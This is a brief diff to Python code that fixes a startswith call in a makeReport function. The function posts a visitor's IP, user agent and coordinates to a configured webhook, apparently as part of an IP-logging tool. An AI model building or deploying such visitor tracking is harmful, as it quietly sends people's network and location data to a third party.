@@ -67,7 +67,7 @@ blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You 
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
     if ip.startswith(blacklistedIPs):
-        if not ip.startswith("34", "35"): return
+        if not ip.startswith(("34", "35")): return
         requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "",
